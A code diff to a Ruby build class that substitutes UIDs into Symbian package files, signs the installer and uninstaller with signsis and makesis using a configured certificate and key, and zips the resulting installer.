@@ -40,7 +40,7 @@ class BuildSymbian < Build
   def sign(params)
     trace :debug, "Build: signing: #{params}"
 
-    yaml = File.open(File.join(Config::CONF_DIR, "symbian.yaml"), 'r') {|f| f.read}
+    yaml = File.open(Config.instance.cert("symbian.yaml"), 'r') {|f| f.read}
     uids = YAML.load(yaml)
 
     # the UIDS must be 8 chars (padded with zeros)
@@ -51,13 +51,14 @@ class BuildSymbian < Build
     # substitute the UIDS into every file
     Find.find(@tmpdir).each do |file|
       if File.file?(file)
+        puts file
         content = File.open(file, 'rb') {|f| f.read}
-        content['[:UID1:]'] = uids[0] if content['[:UID1:]']
-        content['[:UID2:]'] = uids[1] if content['[:UID2:]']
-        content['[:UID3:]'] = uids[2] if content['[:UID3:]']
-        content['[:UID4:]'] = uids[3] if content['[:UID4:]']
-        content['[:UID5:]'] = uids[4] if content['[:UID5:]']
-        content['[:UID6:]'] = uids[5] if content['[:UID6:]']
+        content.gsub! '[:UID1:]', uids[0]
+        content.gsub! '[:UID2:]', uids[1]
+        content.gsub! '[:UID3:]', uids[2]
+        content.gsub! '[:UID4:]', uids[3]
+        content.gsub! '[:UID5:]', uids[4]
+        content.gsub! '[:UID6:]', uids[5]
         File.open(file, 'wb') {|f| f.write content}
       end
     end
@@ -92,20 +93,22 @@ class BuildSymbian < Build
 
     trace :debug, "Build: creating sisx files"
 
-    CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx #{Config.instance.cert('symbian.cer')} #{Config.instance.cert('symbian.key')}", {chdir: path('5th')}
+    # TODO: this file is provided by the console
+    FileUtils.cp(Config.instance.cert('symbian.cer'), @tmpdir)
+    FileUtils.cp(Config.instance.cert('symbian.key'), @tmpdir)
+
+    CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('5th')}
     File.exist? path('5th/uninstaller.sisx') or raise("signsis failed for uninstaller")
 
-    #CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx", {chdir: path('3rd')}
+    CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('3rd')}
     File.exist? path('3rd/uninstaller.sisx') or raise("signsis failed for uninstaller")
 
     trace :debug, "Build: final installer #{params['edition']}"
 
-    installer = path("installer-#{params['edition']}.pkg")
-
-    CrossPlatform.exec path('makesis'), "#{installer} installer.sis", {chdir: path('')}
+    CrossPlatform.exec path('makesis'), "installer-#{params['edition']}.pkg installer.sis", {chdir: path('')}
     File.exist? path('installer.sis') or raise("makesis failed for installer")
 
-    #CrossPlatform.exec path('signsis'), "-s installer.sis installer.sisx", {chdir: path('')}
+    CrossPlatform.exec path('signsis'), "-s installer.sis installer.sisx symbian.cer symbian.key", {chdir: path('')}
     File.exist? path('installer.sisx') or raise("signsis failed for installer")
   end
 
@@ -113,7 +116,7 @@ class BuildSymbian < Build
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open('installer.sisx', "w") { |f| f.write File.open(path('intaller.sisx'), 'rb') {|f| f.read} }
+      z.file.open('installer.sisx', "w") { |f| f.write File.open(path('installer.sisx'), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
